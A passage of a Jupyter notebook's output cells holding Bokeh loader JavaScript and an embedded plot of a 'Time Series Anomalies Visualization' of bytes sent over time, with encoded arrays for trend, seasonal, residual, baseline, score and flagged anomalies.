on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-3.1.1.min.js\"];\n  const css_urls = [];\n\n  const inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {\n    }\n  ];\n\n  function run_inline_js() {\n    if (root.Bokeh !== undefined || force === true) {\n          for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\nif (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"b43f911b-1a0d-4444-be33-d339dd85d6cc\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "  <div id=\"f44c366d-0112-429f-8344-74f25b3860c5\" data-root-id=\"p1299\" style=\"display: contents;\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n  const docs_json = {\"81bb5df1-d958-4fdd-9b20-18c159047c9f\":{\"version\":\"3.1.1\",\"title\":\"Bokeh Application\",\"defs\":[],\"roots\":[{\"type\":\"object\",\"name\":\"Column\",\"id\":\"p1299\",\"attributes\":{\"children\":[{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p1051\",\"attributes\":{\"width\":1200,\"height\":300,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p1061\",\"attributes\":{\"start\":1593963540000.0,\"end\":1594624860000.0}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p1053\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1065\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1067\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p1054\",\"attributes\":{\"text\":\"Time Series Anomalies Visualization\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1143\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p1001\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p1003\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p1002\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAEAAAACAAAAAwAAAAQAAAAFAAAABgAAAAcAAAAIAAAACQAAAAoAAAALAAAADAAAAA0AAAAOAAAADwAAABAAAAARAAAAEgAAABMAAAAUAAAAFQAAABYAAAAXAAAAGAAAABkAAAAaAAAAGwAAABwAAAAdAAAAHgAAAB8AAAAgAAAAIQAAACIAAAAjAAAAJAAAACUAAAAmAAAAJwAAACgAAAApAAAAKgAAACsAAAAsAAAALQAAAC4AAAAvAAAAMAAAADEAAAAyAAAAMwAAADQAAAA1AAAANgAAADcAAAA4AAAAOQAAADoAAAA7AAAAPAAAAD0AAAA+AAAAPwAAAEAAAABBAAAAQgAAAEMAAABEAAAARQAAAEYAAABHAAAASAAAAEkAAABKAAAASwAAAEwAAABNAAAATgAAAE8AAABQAAAAUQAAAFIAAABTAAAAVAAAAFUAAABWAAAAVwAAAFgAAABZAAAAWgAAAFsAAABcAAAAXQAAAF4AAABfAAAAYAAAAGEAAABiAAAAYwAAAGQAAABlAAAAZgAAAGcAAABoAAAAaQAAAGoAAABrAAAAbAAAAG0AAABuAAAAbwAAAHAAAABxAAAAcgAAAHMAAAB0AAAAdQAAAHYAAAB3AAAAeAAAAHkAAAB6AAAAewAAAHwAAAB9AAAAfgAAAH8AAACAAAAAgQAAAIIAAACDAAAAhAAAAIUAAACGAAAAhwAAAIgAAACJAAAAigAAAIsAAACMAAAAjQAAAI4AAACPAAAAkAAAAJEAAACSAAAAkwAAAJQAAACVAAAAlgAAAJcAAACYAAAAmQAAAJoAAACbAAAAnAAAAJ0AAACeAAAAnwAAAKAAAAChAAAAogAAAKMAAACkAAAApQAAAKYAAACnAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\"},\"shape\":[168],\"dtype\":\"float64\",\"order\":\"little\"}],[\"TotalBytesSent\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"RyoAAOU5AADcNAAAqy4AALkrAADJMwAAPzQAAEdtAAANewAAZ3AAAKZ6AADTgAAA8X0AAAODAAAEbwAAnWQAAON4AACbbAAAxXMAAOZzAAArLQAAmTQAABM1AAB3OgAApDIAACI2AAA/MwAAUzYAAMMxAADbKwAABCwAAFp6AAA7aAAA1oAAACB/AAC2egAAXm4AAMV0AAA6egAArm4AANhmAABQZwAAcHcAAEl4AAD0KAAAkzoAAMMtAAAgLAAA9ygAACUqAACmOQAA9ioAALopAADsOAAAeTUAAHeFAACWagAAo4QAAKSDAAC6aAAA13cAAC17AADLgwAAL4AAAL5lAABrawAAtoQAAL5xAAAVMgAAJDIAAPs1AAAdOgAAjDcAAEUnAABiOQAAaTMAAP43AAAGMgAA+y0AAMhjAADbagAA8YMAAK9pAACobAAAiH8AAFZkAACTfQAAU4IAAPtwAAA7ewAAJ4MAAAFnAACiOQAArygAAC4oAAA2LwAAliwAAEM6AACPOAAA7zYAAJszAADFMAAApzkAAFRpAADtegAAZmYAABSDAABUfwAAPmIAAFh5AAD6YgAAcmQAAOllAABJZAAA6L0AACCzAACGLQAARzMAAJgvAABjNwAAETYAAFkrAACcNQAAJykAACYnAAAaMQAAQTcAAClIAAAVTAAAiEoAANZEAAAlSQAAzEQAABVNAACKSwAA4EgAAERFAACJRQAAJz8AAGVAAAC/LAAAMSkAAKc2AADLKQAAvzEAAF8xAAClOAAAvTAAAOksAABhJwAA0S0AAMlGAAAyRAAAuEYAAHxAAACWRQAAbkAAALREAABxSAAATkwAANU+AACsOwAAAzwAAPZGAAAGNgAAJjQAAEIuAABnKwAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"residual\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"lP7//y0DAAD7AAAA3f7//4f///9nAgAAAAQAAH/1//8KCAAAPPX//4P7//+WAwAAvAIAADEDAAD+9v//f/j//5sGAABMAQAAxAIAAG4DAACPAgAAU/7//0ADAAD6BQAAjwQAAAsCAABQ/f//ewUAAGwDAADb+f///Pr//z4FAAAp+P//AQYAAFIDAABPAwAAWPf//6P7//9bAwAAuP///2j5//9o/P//1v3//wEFAAAn/P//4AYAABn9//8I+P//4Pn//wL5//+NAgAAQ/n//0j5//8OBgAAgwIAAHUSAABi+///JQkAAIUIAAA68///PwIAAHoEAAAVCwAAkAsAAM/4//9A/f//if7//7P2//9/////+fz//+oCAACPAwAAugUAAB33///V////yAAAAPgFAAA8/v//avn//5f1//+E/v//vgwAALnz//++/f//cRAAAMT0///LCQAAAg8AAP4JAADuDwAA2Pb//9zp//+gBQAAP/b//1L1//82+P//2fT//2UEAAA/+f//q/7//wr8//9f9///f/z//3MAAAD/DwAAWPb//yoUAABXEgAAQ/j//04MAABg9P//mPX//30BAABQ/v///z8AAE0+AACd8///xvz//7v4//84AQAA2f7//0X3///7+v//gvf//9X4///RAwAAFgUAAN34//89+f//ufn//3z1///R9///TPv//6r9//+k/f//svn//yP+///n/v///Ob//5Ho//82AQAA4/////sLAACaAQAA6QQAAAgGAACNBgAArwYAAOkFAADlAAAAgv7//0kGAACC/f//NgYAACYAAADM/f//ZwMAAGT9//+FBAAA4wUAAEL+///4/f//F/b//zn4///kAgAAjwIAAE77//+I/v//\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"trend\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"t1UAAMlVAADZVQAA6lUAAPpVAAAKVgAAGlYAAChWAAA2VgAARFYAAFBWAABbVgAAZVYAAG9WAAB3VgAAflYAAIRWAACKVgAAjlYAAJNWAACYVgAAnlYAAKZWAACxVgAApVYAAJlWAACLVgAAeVYAAGRWAABJVgAAKlYAAAVWAADcVQAAslUAAIlVAABjVQAAQlUAACdVAAAVVQAAC1UAAApVAAARVQAAI1UAAD1VAABfVQAAiFUAALVVAADiVQAADlYAADlWAABiVgAAiVYAAK9WAADTVgAA+FYAABxXAABBVwAAZFcAAIRXAACgVwAAt1cAAMlXAADVVwAA3FcAAN9XAADdVwAA11cAAM1XAADCVwAAtVcAAKVXAACRVwAAelcAAF9XAAA/VwAAG1cAAPNWAADJVgAAnFYAAGxWAAA6VgAACFYAANdVAACqVQAAhFUAAGdVAABTVQAASlUAAExVAABZVQAAblUAAIhVAAClVQAAyVUAAPhVAAAyVgAAdlYAAMBWAAALVwAAU1cAAJJXAADHVwAA7VcAAAVYAAANWAAABlgAAPBXAADLVwAAlVcAAExXAADsVgAAcVYAANtVAAApVQAAXlQAAH1TAACIUgAAfFEAAFpQAAAhTwAA1U0AAHlMAAARSwAApEkAADZIAADPRgAAckUAACREAADnQgAAvEEAAKVAAACkPwAAvD4AAO89AABCPQAAtjwAAEo8AAD3OwAAtTsAAH87AABSOwAALjsAABE7AAD8OgAA7ToAAOI6AADSOgAAwToAALE6AACjOgAAlToAAIg6AAB7OgAAbToAAF86AABROgAAQToAADA6AAAdOgAACjoAAPQ5AADdOQAAxDkAAKk5AACNOQAAbjkAAE45AAAsOQAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"seasonal\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"/NX//+/g//8H3v//5Nn//zjW//9Y2///Jdr//58hAADLHAAA5iQAANMoAADhJgAAziQAAGEpAACPIQAAoBUAAMMbAADEFAAAcRoAAOQZAAAD1P//qN///yzb///M3f//b9f//33d//9l3///Xtr///LX//+42///39r//xYfAAA2GgAAIiUAAEQmAAACIgAAxCEAAPojAADIIQAA6hkAAGUYAADWFQAAdyQAAAoeAABu1///K97///ba//823v//Ctn//+va//+34P//K9v//8TZ//8K3P///tv//+QbAADzFwAAGCQAAJkjAADgHQAA4B0AAOkeAADgIAAAwRwAABAVAABOFgAAVi4AAD0jAADU2v//dt3//2zb///83v//V9r//8nY//9O4v//hdv//xLb//8C3f//9t3//8QXAAAdFgAAKiEAAB8gAAA/GQAAkhkAACsaAAB0HgAABh4AALARAADyFQAA4DYAAJwnAABc3v//qNz//+Tc///O4P//R+H//x7f//9G6P//8uD////f//+g4f//O+X//9sQAADgEgAABxgAAPgWAAAwFQAAZRIAAL0VAACuFwAAaBgAAI8OAADPEAAAiSkAAFQhAABi5///BuX//4Tm//8J5///Y+n//5vn//+Q7///Auj//xvm//965v//uOz//ycLAADxDwAAEg8AALQOAACvEQAAxAoAAHsRAACjEAAAdxIAANcKAACqCgAAdhwAAFUcAAA38P//IO7//5rv//817f//6fH//3Xw//9G9///Te///07s///Z6///uvT///cFAAA0DAAAEwYAAPUFAAB5DQAAxQIAAB8NAADNCQAAYAwAAJ8GAADWAwAAJwwAABMVAACV+f//KPj//6f5//+z8///\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"weights\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"baseline\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"sysAALc2AADgMwAAzi8AADIsAABhMQAAPjAAAMh3AAACcwAAK3sAACN/AAA8fQAANHsAANF/AAAGeAAAHmwAAEdyAABOawAAAHEAAHdwAACbKgAARjYAANIxAAB8NAAAFC4AABY0AADvNQAA1zAAAFYuAAAAMgAACDEAABt1AAAScAAA1HoAAM17AABmdwAABncAACJ5AADedgAA9m4AAHBtAADoagAAmnkAAEdzAADNLAAAsjMAAKowAAAYNAAAFy8AACMxAAAYNwAAszEAAHIwAADdMgAA9TIAAAFzAAA0bwAAfXsAAB57AACAdQAAl3UAALJ2AAC1eAAAnnQAAO9sAAArbgAALYYAAAt7AACWMgAAKzUAABAzAACNNgAA0TEAACgwAACNOQAAoDIAAAUyAADKMwAAkTQAADFuAABXbAAAMncAAPZ1AADqbgAAFm8AAJJvAADHcwAAUHMAAPxmAABMawAAT4wAACV9AAABNAAAcDIAANwyAAAANwAAvTcAAN01AABQPwAARDgAAJE3AABmOQAAKD0AAOBoAADtagAADnAAAOluAAD8bAAA+2kAAAltAACabgAA2m4AAGtkAAD5ZQAA6H0AANJ0AADpOQAAgTYAAN02AAAqNgAAODcAABQ0AAChOgAApTEAAFEuAABILQAAKjIAAExPAADYUgAAz1AAAFpPAABUUQAAgEkAAGtPAADmTQAALk8AACFHAACiRgAAK1gAANRXAACIKwAATikAAKsqAAAwKAAA1SwAAFYrAAAXMgAADSoAAP8mAAB7JgAATy8AAH9AAACwRgAAgUAAAFVAAADKRwAABj0AAFBHAADrQwAAakYAAJNAAAC0PQAA7EUAAL1OAAAhMwAAljEAAPQyAADfLAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"score\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\"},\"shape\":[168],\"dtype\":\"float64\",\"order\":\"little\"}],[\"anomalies\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1144\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1145\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1140\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#1f77b4\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1141\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#1f77b4\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1142\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"line_color\":{\"type\":\"value\",\"value\":\"navy\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#1f77b4\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1154\",\"attributes\":{\"data_source\":{\"id\":\"p1001\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1155\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1156\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Line\",\"id\":\"p1151\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"baseline\"},\"line_color\":\"green\"}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Line\",\"id\":\"p1152\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"baseline\"},\"line_color\":\"green\",\"line_alpha\":0.1}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Line\",\"id\":\"p1153\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"baseline\"},\"line_color\":\"green\",\"line_alpha\":0.2}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1167\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p1158\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p1160\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p1159\"},\"data\":{\"type\":\"map\",\"entries\":[[\"level_0\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAEAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"cgAAAHMAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAQJZ4zd0IAAPiToTN3Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"TotalBytesSent\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"6L0AACCzAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"residual\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"/z8AAE0+AAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\"